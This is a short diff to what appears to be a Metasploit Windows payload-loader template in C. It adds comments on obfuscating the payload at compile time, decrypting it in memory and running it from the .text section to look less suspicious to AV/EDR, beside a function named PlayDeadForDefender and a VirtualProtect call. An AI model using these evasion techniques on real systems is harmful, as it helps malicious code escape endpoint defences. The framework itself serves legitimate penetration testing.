@@ -5,7 +5,11 @@
 
 #include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
+// Create a class that will perform compile-time obfuscation of payload, that will be stored in custom section.
+// After template runs, the payload gets decrypted in memory and copied into a variable located in .text section.
 auto tmpPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+
+// A storage for final decrypted payload. It is specifically stored in .text section as it seems to make execution less obvious to AV/EDR when it's being executed from .text section.
 char __attribute__((section(".text"))) finalPayload[<%= payload_length %>];
 
 int PlayDeadForDefender()
@@ -56,7 +60,7 @@ int main() {
     }
 
     memcpy(finalPayload, tmpPayload, scsize);
-    
+
     if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READ, &dwOldProtect))
     {
       return 1;
